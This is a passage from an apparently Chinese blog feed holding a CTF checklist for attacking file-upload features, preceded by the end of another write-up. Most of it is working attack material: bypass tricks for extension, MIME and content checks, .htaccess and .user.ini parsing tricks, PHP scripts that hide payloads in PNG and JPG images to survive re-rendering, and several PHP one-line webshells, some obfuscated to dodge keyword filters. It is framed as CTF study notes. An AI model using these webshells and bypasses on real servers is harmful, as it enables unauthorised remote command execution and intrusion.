<p><img   src="/../img/$%7Bfiilename%7D/OIP-C.mG6e-yzRUBIZy6otnpkH1wAAAAw=169&h=197&c=7&r=0&o=5&dpr=1.7&pid=1.jpeg"  alt="会赢的五条悟 的图像结果"></p>
<p>还有海大你无敌了，暑假才放一个月半</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Checklist of upload</title>
    <url>/2024/08/18/Checklist-of-upload/</url>
    <content><![CDATA[<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><span id="more"></span>

<p>文件上传漏洞在CTF黑盒测试的时候我们基本上只能盲打，利用自己的经验和大量的fuzz才能解出，想给自己写个Checklist能让我在黑盒测试这类漏洞时能有一个完备和快速的测试吧</p>
<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><h2 id="寻找存储路径"><a href="#寻找存储路径" class="headerlink" title="寻找存储路径"></a>寻找存储路径</h2><ul>
<li><p>根据题目直接知道</p>
</li>
<li><p>有回显图片，直接查看图片链接</p>
</li>
<li><p>目录爬虫，爬出存储路径</p>
</li>
</ul>
<h2 id="解析的文件格式"><a href="#解析的文件格式" class="headerlink" title="解析的文件格式"></a>解析的文件格式</h2><p>我们并不知道服务器会解析什么文件时可以批量上传test文件看看是否解析</p>
<ul>
<li>php（apache）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo 123;?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>jsp（tomcat）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%= 123%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>asp（IIS）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">        Dim number As Integer</span><br><span class="line">        number = 123</span><br><span class="line">        Response.Write(number)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<hr>
<p>前两个条件很快就可以判断出来，只需要先传入一张正常的文件一般就可以知道存储的路径，接着传入三个测试文件也就可以判断了</p>
<p>重点还是绕过校验</p>
<h1 id="图片校验"><a href="#图片校验" class="headerlink" title="图片校验"></a>图片校验</h1><h2 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h2><ul>
<li>关闭js</li>
<li>改包</li>
</ul>
<h2 id="后端校验"><a href="#后端校验" class="headerlink" title="后端校验"></a>后端校验</h2><h3 id="后缀名校验"><a href="#后缀名校验" class="headerlink" title="后缀名校验"></a>后缀名校验</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><p>把php，asp，jsp都列入黑名单</p>
<h5 id="替代"><a href="#替代" class="headerlink" title="替代"></a>替代</h5><p>需要手动配置是否解析，不一定成功</p>
<ul>
<li>php</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</span><br></pre></td></tr></table></figure>

<ul>
<li>jsp</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</span><br></pre></td></tr></table></figure>

<ul>
<li>asp</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</span><br></pre></td></tr></table></figure>

<h5 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h5><p>windows对大小写不敏感</p>
<p>linux对大小写敏感</p>
<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>windows自动删掉空格</p>
<h5 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h5><p>windows自动删掉点</p>
<h5 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h5><p>windows自动删除后缀后的::$DATA</p>
<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>pphphp</p>
<h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p>move_uploaded_file遇到\x00字符后会截断路径名，在实现上存在安全漏洞</p>
<p>使用限制:<br>1、php版本小于5.3.4<br>2、php.ini的magic_quotes_gpc为OFF状态</p>
<h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><h5 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h5><p>图片最后插入一句话木马</p>
<h6 id="再检验"><a href="#再检验" class="headerlink" title="再检验"></a>再检验</h6><ul>
<li>伪造文件头</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">JPEG (jpg)，文件头：FFD8FF</span><br><span class="line">PNG (png)，文件头：89504E47</span><br><span class="line">GIF (gif)，文件头：47494638</span><br><span class="line">TIFF (tif)，文件头：49492A00</span><br><span class="line">Windows Bitmap (bmp)，文件头：424D</span><br><span class="line">CAD (dwg)，文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，文件头：7B5C727466</span><br><span class="line">XML (xml)，文件头：3C3F786D6C</span><br><span class="line">HTML (html)，文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，文件头：2142444E</span><br><span class="line">MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，文件头：E3828596</span><br><span class="line">ZIP Archive (zip)，文件头：504B0304</span><br><span class="line">RAR Archive (rar)，文件头：52617221</span><br><span class="line">Wave (wav)，文件头：57415645</span><br><span class="line">AVI (avi)，文件头：41564920</span><br><span class="line">Real Audio (ram)，文件头：2E7261FD</span><br><span class="line">Real Media (rm)，文件头：2E524D46</span><br><span class="line">MPEG (mpg)，文件头：000001BA</span><br><span class="line">MPEG (mpg)，文件头：000001B3</span><br><span class="line">Quicktime (mov)，文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，文件头：4D546864</span><br></pre></td></tr></table></figure>

<ul>
<li>.htaccess解析</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg </span><br></pre></td></tr></table></figure>

<ul>
<li>.user.ini（apache和Nginx都适用）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// .user.ini，这里等号两边不能有空格</span><br><span class="line">auto_prepend_file=1.jpg</span><br><span class="line">// 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">// 1.php(任意php文件)</span><br></pre></td></tr></table></figure>

<h6 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h6><ul>
<li>GIF绕过</li>
</ul>
<p>寻找前后不变的地方插入一句话木马</p>
<ul>
<li>PNG绕过</li>
</ul>
<p>生成脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>JPG绕过</li>
</ul>
<p>生成脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h3><p>content-type</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text/html ： HTML格式</span><br><span class="line">text/plain ：纯文本格式</span><br><span class="line">text/xml ： XML格式</span><br><span class="line">image/gif ：gif图片格式</span><br><span class="line">image/jpeg ：jpg图片格式</span><br><span class="line">image/png：png图片格式</span><br><span class="line">以application开头的媒体格式类型：</span><br><span class="line"></span><br><span class="line">application/xhtml+xml ：XHTML格式</span><br><span class="line">application/xml： XML数据格式</span><br><span class="line">application/atom+xml ：Atom XML聚合格式</span><br><span class="line">application/json： JSON数据格式</span><br><span class="line">application/pdf：pdf格式</span><br><span class="line">application/msword ： Word文档格式</span><br><span class="line">application/octet-stream ： 二进制流数据（如常见的文件下载）</span><br><span class="line">application/x-www-form-urlencoded ： &lt;form encType=””&gt;中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</span><br><span class="line">另外一种常见的媒体格式是上传文件之时使用的：</span><br><span class="line"></span><br><span class="line">multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</span><br></pre></td></tr></table></figure>

<h3 id="对文件内容验证"><a href="#对文件内容验证" class="headerlink" title="对文件内容验证"></a>对文件内容验证</h3><p>其实要是对文件内容验证，要不是一些很常规的一些，那基本要白盒去做了</p>
<h4 id="过滤php和"><a href="#过滤php和" class="headerlink" title="过滤php和?"></a>过滤php和?</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>不一定成功，有条件限制</p>
<h4 id="过滤eval"><a href="#过滤eval" class="headerlink" title="过滤eval"></a>过滤eval</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system($_POST[&#x27;cmd&#x27;];)?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><ul>
<li>php</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;xindong&quot;]); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php $lang = (string)key($_POST);$lang($_POST[&#x27;xindong&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php $k=&quot;ass&quot;.&quot;ert&quot;; $k($&#123;&quot;_PO&quot;.&quot;ST&quot;&#125; [&#x27;xindong&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[&quot;xindong&quot;]);  ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php                  </span><br><span class="line">@$_=&quot;s&quot;.&quot;s&quot;./*-/*-*/&quot;e&quot;./*-/*-*/&quot;r&quot;;                  </span><br><span class="line">@$_=/*-/*-*/&quot;a&quot;./*-/*-*/$_./*-/*-*/&quot;t&quot;;                  </span><br><span class="line">@$_/*-/*-*/($/*-/*-*/&#123;&quot;_P&quot;./*-/*-*/&quot;OS&quot;./*-/*-*/&quot;T&quot;&#125;                  </span><br><span class="line">[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?&gt;    密码是  -7</span><br></pre></td></tr></table></figure>

<ul>
<li>asp</li>
</ul>
